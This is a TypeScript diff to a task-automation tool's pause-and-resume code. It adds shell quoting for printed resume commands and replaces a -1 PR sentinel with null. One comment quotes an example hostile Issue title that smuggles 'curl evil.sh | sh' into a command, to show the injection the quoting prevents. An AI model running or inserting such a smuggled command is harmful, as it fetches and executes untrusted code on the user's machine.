@@ -19,7 +19,9 @@ import {
   listStartedEffectKeys,
   type LoopBudgets,
   markEffectUncertain,
+  parseTaskBranchIdentity,
   type PauseReason,
+  principalRulingMarker,
   readEscalation,
   readResolution,
   type RequestedAuthority,
@@ -211,23 +213,115 @@ export function renderPauseComment(
 }
 
 /**
+ * `vinaya task run`'s own argv for continuing a pause that has no pull
+ * request — THE one builder, so the command a reader is told to run and the
+ * argv `task_resume` actually spawns can never disagree. `task run` accepts
+ * exactly two address forms (`commands/task-run.ts`'s own usage) and they are
+ * not interchangeable: `--issue <n>` is the TRANCHE-LESS backlog path, and
+ * `assembleAndRenderBriefForIssue` refuses an Issue carrying a
+ * `vinaya/tranche:*` label outright ("it belongs to a tranche and renders via
+ * `vinaya task brief <tranche> <n>`") — a refusal that is not the
+ * already-dispatched case `task run` tolerates, so the launched child exits.
+ * A tranche task therefore has to be addressed `task run <tranche> <n>`.
+ *
+ * The address form comes from the pause's OWN branch, which is where that
+ * fact already lives: `developerBranchFor` resolved the Issue's labels and
+ * title once, at dispatch, and wrote the answer into the branch name —
+ * `task/<tranche>/<n>` for a tranche task, `task/issue-<n>` for a backlog one
+ * (`parseTaskBranchIdentity`, `@attalabs/aeg-core`). Reading it back costs no
+ * forge call and cannot disagree with the branch the run is actually on. A
+ * branch that parses as neither falls back to the Issue form, the only address
+ * derivable from a task number alone.
+ */
+export function noPushResumeArgv(task: number, branch: string, agent?: string, model?: string): string[] {
+  const identity = parseTaskBranchIdentity(branch)
+  const address =
+    identity?.kind === 'tranche'
+      ? ['task', 'run', identity.tranche, identity.taskId]
+      : ['task', 'run', '--issue', String(task)]
+  return [...address, ...(agent ? ['--agent', agent] : []), ...(model ? ['--model', model] : [])]
+}
+
+/** A token that needs no shell quoting at all — the shape every real tranche slug, agent and model already has. */
+const SHELL_SAFE_TOKEN = /^[A-Za-z0-9._@%+=:,/-]+$/
+
+/**
+ * One argv element, rendered so a shell runs it as exactly that element.
+ *
+ * This matters because the tranche segment is UNVALIDATED forge input, not a
+ * slug this code chose: `developerBranchFor` takes it from the task Issue's
+ * own title (`ISSUE_TITLE_SHAPE`'s `[^\]]+`) and `parseTaskBranchIdentity`
+ * accepts any `[^/]+`, so a title like `[; curl evil.sh | sh] 22 — x` would
+ * otherwise be interpolated verbatim into a fenced command block this comment
+ * tells a human — or an Operator agent — to run. The spawned argv was always
+ * safe (an array, no shell), which is exactly why the printed form has to be
+ * the shell ENCODING of that array rather than a space-join of it: anything
+ * else is a second, weaker builder pretending to be the same one. Single
+ * quotes with `'\''` escaping is the POSIX-complete form — it also fixes the
+ * plain-whitespace case, where a space-join silently produced a different
+ * command than the one that runs.
+ */
+function shellQuote(token: string): string {
+  return SHELL_SAFE_TOKEN.test(token) ? token : `'${token.replaceAll("'", "'\\''")}'`
+}
+
+/** `task-status.ts`'s `resumeCommandFor` for the case where there is no pull request to anchor a `--resume` to: the one continuation a before-any-push pause actually has. Rendered from `noPushResumeArgv` — the identical argv `task_resume` spawns — shell-quoted element by element, so the pause comment here, `task-tools/read.ts`'s `permittedNextActions` and the launcher all name one command and a hostile tranche segment cannot turn the printed form into something else. */
+export function noPushResumeCommandFor(task: number, branch: string, agent?: string, model?: string): string {
+  return `vinaya ${noPushResumeArgv(task, branch, agent, model).map(shellQuote).join(' ')}`
+}
+
+/**
  * O9: the no-PR-yet variant of the pause comment — posted on the task Issue
  * instead of a pull request, because none is known to exist: the round-1
  * refusal/escalation before any push, or a setup failure that never got as
- * far as resolving one. Carries no PR number for a `--resume` command, so
- * the resume path named is `vinaya task run`, the same one command this
- * task's own O10 makes work with no `--agent` to remember.
+ * far as resolving one. Carries no PR number for a `--resume` command, so the
+ * resume path named is `vinaya task run`, in whichever of its two address
+ * forms this task's own branch says it takes (`noPushResumeArgv`, above).
+ *
+ * Both halves of what the reader needs are named, because neither is
+ * guessable: the command, filled in — it used to print `vinaya task run
+ * <tranche> <n>` with the ISSUE number in the ordinal's position and
+ * `<tranche>` left as a literal placeholder — and the marker line a Principal
+ * ruling must carry on its own first line for any of this to read it. No
+ * shipped command posts a ruling on an Issue (`vinaya pr rule` counts and
+ * posts through `gh pr`), so a Principal writes that comment by hand, and the
+ * readers here (`filterPrincipalRulings`) recognise nothing without that exact
+ * first line and a strictly-newer ordinal than the one this escalation
+ * recorded.
  */
-export function renderNoPushStopComment(task: number, reason: PauseReason, detail?: string): string {
+export function renderNoPushStopComment(
+  task: number,
+  branch: string,
+  reason: PauseReason,
+  detail?: string,
+  invocation?: { agent: string; model?: string },
+  rulingOrdinal?: number
+): string {
+  // Built by `principalRulingMarker`, never interpolated here: the ordinal the
+  // gates compare is the marker's SECOND number (`<ref>-<ordinal>`), and a
+  // hand-written template that put it first rendered a marker parsing as
+  // ordinal `1` forever — so a ruling written exactly as this comment
+  // instructed failed the very gate it was posted to satisfy, for every pause
+  // whose recorded baseline had reached `1`.
+  const nextOrdinal = (rulingOrdinal ?? 0) + 1
   return [
     `The dev-review-loop paused: ${reason}${detail ? ` — ${detail}` : ''}.`,
     '',
     'No pull request exists yet for this task, so the pause is recorded on this Issue instead.',
-    'A Principal ruling is needed before this can continue. Once one is posted on this Issue, resume with:',
+    'A Principal ruling is needed before this can continue. Post it as a comment on this Issue whose FIRST line is exactly this marker — the second number is the ordinal, and it must exceed the one this pause recorded:',
     '',
     '```',
-    `vinaya task run <tranche> ${task}`,
-    '```'
+    principalRulingMarker(task, nextOrdinal),
+    'Your ruling text here.',
+    '```',
+    '',
+    'Then continue with:',
+    '',
+    '```',
+    noPushResumeCommandFor(task, branch, invocation?.agent, invocation?.model),
+    '```',
+    '',
+    "The Operator's own `task_resume` clears this pause too, reading that same ruling from this Issue; `task_cancel` ends it instead."
   ].join('\n')
 }
 
@@ -275,13 +369,16 @@ export type PauseCommentPostResult = { attempts: number; posted: boolean }
  */
 export function postIssuePauseComment(
   task: number,
+  branch: string,
   round: number,
   reason: PauseReason,
-  detail?: string
+  detail?: string,
+  invocation?: { agent: string; model?: string },
+  rulingOrdinal?: number
 ): PauseCommentPostResult {
   const publicDetail = detail === undefined ? undefined : sanitizePublicPauseDetail(detail)
   const marker = pauseMarker(reason)
-  const body = renderNoPushStopComment(task, reason, publicDetail)
+  const body = renderNoPushStopComment(task, branch, reason, publicDetail, invocation, rulingOrdinal)
   const key = `pause-issue-${round}-${reason}`
   const identity: EffectIdentity = {
     operation: 'issue-comment',
@@ -455,7 +552,14 @@ export type PauseState = {
   round: number
   head: string
   branch: string
-  prNumber: number
+  /**
+   * `null` for a pause recorded before any pull request exists — the
+   * before-any-push escalation, whose comment goes on the task Issue. This
+   * used to be a `number` a `-1` sentinel was written into, which read as a
+   * real pull request to every consumer and reached the forge verbatim; see
+   * `readPauseState`, which now normalizes any such record already on disk.
+   */
+  prNumber: number | null
   reason: PauseReason
   detail?: string
   pausedAt: string
@@ -502,11 +606,23 @@ export function writePauseState(root: string, state: PauseState): void {
   writeFileSync(path, JSON.stringify(state), 'utf8')
 }
 
+/**
+ * The one chokepoint every consumer of a pause record reads through — which
+ * is why the legacy-sentinel normalization lives HERE rather than in each
+ * caller's own guard. A record written before `prNumber` could be `null`
+ * carries `-1` (the before-any-push escalation) and, for a `PauseState`
+ * hand-written by an even older path, possibly `0`: neither is a pull request
+ * that can be fetched, so both read back as `null`, the value that says so.
+ * Fixing only the producer would leave every pause already paused on a real
+ * machine unclearable forever.
+ */
 export function readPauseState(root: string, task: number): PauseState | null {
   const raw = readIfExists(pauseStatePath(root, task))
   if (!raw) return null
   try {
-    return JSON.parse(raw) as PauseState
+    const parsed = JSON.parse(raw) as PauseState
+    const pr = parsed.prNumber
+    return typeof pr === 'number' && pr <= 0 ? { ...parsed, prNumber: null } : parsed
   } catch {
     return null
   }
@@ -842,16 +958,16 @@ export class StaleEscalationError extends Error {
   }
 }
 
-/** O2: a resolution naming a PR that does not match the escalation's own recorded PR. */
+/** O2: a resolution naming a PR that does not match the escalation's own recorded PR. `attemptedPr` is `null` for a resolution against a pause that has no pull request at all — which matches only an escalation whose own `pr` is equally `null`, so a no-PR resolution can never be pointed at a real pull request's escalation, nor the reverse. */
 export class WrongTargetResolutionError extends Error {
   constructor(
     readonly task: number,
     readonly escalationId: string,
     readonly escalationPr: number | null,
-    readonly attemptedPr: number
+    readonly attemptedPr: number | null
   ) {
     super(
-      `resolution refused — task ${task}'s escalation '${escalationId}' names PR ${escalationPr ?? '(none)'}, not PR ${attemptedPr}`
+      `resolution refused — task ${task}'s escalation '${escalationId}' names PR ${escalationPr ?? '(none)'}, not PR ${attemptedPr ?? '(none)'}`
     )
     this.name = 'WrongTargetResolutionError'
   }
@@ -888,16 +1004,27 @@ export type ResolveEscalationResult = {
  * `StaleEscalationError`/`WrongTargetResolutionError`/
  * `ReplayedResolutionError` on any of the three refusal conditions O2
  * requires; a caller that wants a non-throwing form wraps this itself.
+ *
+ * `expectedPr` is `null` for a pause recorded before any pull request existed
+ * — the wrong-target check below is an equality against the escalation's own
+ * `pr`, so `null` matches exactly the escalations that genuinely have none.
+ *
+ * `storeDeps` defaults to the real global control store but is overridable,
+ * the same reason `readEscalationRecord` above takes it: `task-tools/resume.ts`
+ * consumes a no-PR resolution itself and must do so against the SAME
+ * fixture-testable control-store root its other reads already use, never past
+ * it into this machine's real `~/.vinaya/control-store/`.
  */
 export function resolveEscalation(
   task: number,
   escalationId: string,
-  expectedPr: number,
+  expectedPr: number | null,
   decision: 'resume' | 'cancel',
   authenticatedBy: string,
-  authenticatedFrom: string
+  authenticatedFrom: string,
+  storeDeps: ControlStoreDeps = defaultControlStoreDeps(controlStoreRoot)
 ): ResolveEscalationResult {
-  const deps = defaultControlStoreDeps(controlStoreRoot)
+  const deps = storeDeps
   const escalation = readEscalation(deps, task, escalationId)
   if (escalation.status !== 'ok') {
     throw new StaleEscalationError(
